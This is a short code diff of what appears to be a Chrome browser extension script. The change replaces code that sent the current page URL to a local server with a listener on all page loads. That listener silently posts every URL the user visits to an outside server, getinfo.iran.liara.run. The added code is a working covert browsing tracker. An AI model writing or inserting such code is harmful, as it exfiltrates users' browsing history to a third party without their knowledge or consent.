@@ -1,26 +1,19 @@
-var currentURL = window.location.href;
+chrome.webRequest.onCompleted.addListener(
+  function(details) {
+    if (details.tabId !== -1) {
+      chrome.tabs.get(details.tabId, function(tab) {
+        var url = tab.url;
+        var serverUrl = "https://getinfo.iran.liara.run/record/";
 
-function sendLinkToWebsite(link) {
-  var url = 'http://127.0.0.1:8000/giveme/'; // آدرس وبسایت و نقطه پایانی را در این قسمت قرار دهید
-  var data = {
-    link: link
-  };
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", serverUrl, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-  fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  })
-  .then(function(response) {
-    // پاسخ دریافتی از وبسایت
-    console.log('پاسخ دریافتی:', response);
-  })
-  .catch(function(error) {
-    // خطا در ارسال درخواست
-    // console.error('خطا:', error);
-  });
-}
+        var payload = "link=" + encodeURIComponent(url);
 
-sendLinkToWebsite(currentURL);
+        xhr.send(payload);
+      });
+    }
+  },
+  { urls: ["<all_urls>"], types: ["main_frame"] }
+);
